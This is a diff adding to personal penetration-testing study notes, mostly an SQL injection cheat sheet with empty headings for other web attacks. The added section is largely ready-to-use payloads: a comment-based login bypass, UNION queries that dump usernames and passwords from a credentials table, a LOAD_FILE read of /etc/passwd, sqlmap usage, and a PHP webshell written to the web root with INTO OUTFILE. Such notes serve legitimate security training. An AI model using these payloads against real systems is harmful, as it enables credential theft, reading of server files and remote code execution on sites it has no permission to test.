@@ -2,36 +2,139 @@
 ## SQL Injection (SQLi)
 *Lots of webpages store data in SQL databases. If they don't sanitize user inputs, then it is possible to query the database from an input field *
 
+Connect to SQL
+```bash
+mysql -u <user> -p
+<password>
+```
+```bash
+mysql -u <user> -h <IP> -P <port> -p
+```
+According to [Operator Precedence](https://dev.mysql.com/doc/refman/8.0/en/operator-precedence.html) (Order of Operations) AND statements evaluate first and OR evaluate last
+
+SQL commands
+```sql
+SELECT UNION FROM WHERE
+```
 [Cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 
 Detection
 try single and double quotes 
-'' ""
+'' "", Comments --
 Use a # to terminate a line
-```
+```sql
 <name>' or 1=1#
 <name>' union select null, null#
 <name>' union select null,null,version()#
 <name>' union select null,null,table_name from information_schema.tables#
 ```
+
+
+**URL Encoding**
+
+| Payload | URL Encoding |
+| ------- | ------------ |
+| '       | %27          |
+| "       | %22          |
+| #       | %23          |
+| ;       | %3B          |
+| )       | %29          |
+
+
 Since UNION joins parameters, it can only return as many
+
+**Boolean Based**
+With `Boolean Based` SQL injection, we can use SQL conditional statements to control whether the page returns any output at all, 'i.e., original query response,' if our conditional statement returns `true`.
+
+**Time Based**
+As for `Time Based` SQL injections, we use SQL conditional statements that delay the page response if the conditional statement returns `true` using the `Sleep()` function.
 
 **Blind**
 These are SQL injections that when executed, show no obvious clue to the user
-1
-**Cookies**
 
+**Cookies**
+Try using SQLi in BurpSuite on these fields to see if the field is inject-able. 
 
 **SQL-Map**
 Save a HTTP Post request with the query as a .txt
+
+```bash
+sqlmap -r <HTTP post file>
 ```
-sqlmap -r <request file>
+**Substring**
+Sometimes you can enumerate individual letters/digits with a query. Enumerating through you can detect version information, passwords, and other information.
+```sql
+' and substring(select version()), x, y) = 'a.b.c'#
+```
+**Comments**
+In line comments `--` `#` 
+Multi-line `/**/`
+Auth bypass w. comments
+```sql
+admin'--
+SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
+
+admin')--
+```
+![[../../Pasted image 20250513110359.png]]
+
+**Union**
+1. Start by identifying the number of columns
+2. Identify columns
+Run through 1, -> 1, 2 and onward to identify number of columns
+```sql
+' UNION select 1,2,3,4-- -
+```
+```sql
+ds'UNION SELECT 1, user(), 3, 4 -- - 
+```
+![[../../Pasted image 20250513125617.png]]
+
+You can enumerate database info like this 
+```sql
+cn' UNION select 1, username, password, 4 from dev.credentials-- -
+```
+```sql
+cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
+```
+```sql
+cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials' AND username = "newuser"-- -
+```
+**Files**
+Identify DB user, then identify if you have FILE privileges. In theory, only DBA's should have FILE privileges
+Try things with
+```sql
+SELECT USER()
+SELECT CURRENT_USER()
+SELECT user from mysql.user
+```
+```sql
+cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
+```
+
+To be able to write files to the back-end server using a MySQL database, we require three things:
+1. User with `FILE` privilege enabled
+2. MySQL global `secure_file_priv` variable not enabled
+3. Write access to the location we want to write to on the back-end server
+**PHP Webshells via SQLi**
+```php
+<?php system($_REQUEST[0]); ?>
+```
+In a SQLi it may look more like 
+```sql
+cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
 ```
 ![[../../cheatsheet-sql-injection-fundamentals.pdf]]
 
 
+---
+
 ## Cross Site Scripting (XSS)
+
+---
 ## Command Injection
+
+---
 ## Insecure File Upload
 *Sometimes there are weak restrictions on file uploads*
 
@@ -59,8 +162,14 @@ At the top of a file is metadata. You can see this metadata when you cat the fil
 
 ![[../../cheatsheet-file-inclusion.pdf]]
 
+
+---
 ## AUTHN Attacks
+
+---
 ## External Entities Injection (XXE)
+
+---
 ## Insecure Direct Object Reference (IDOR)
 *Being able to manipulate a variable we really shouldn't even be able to see*
 Here is a quick example, lets say you see this site
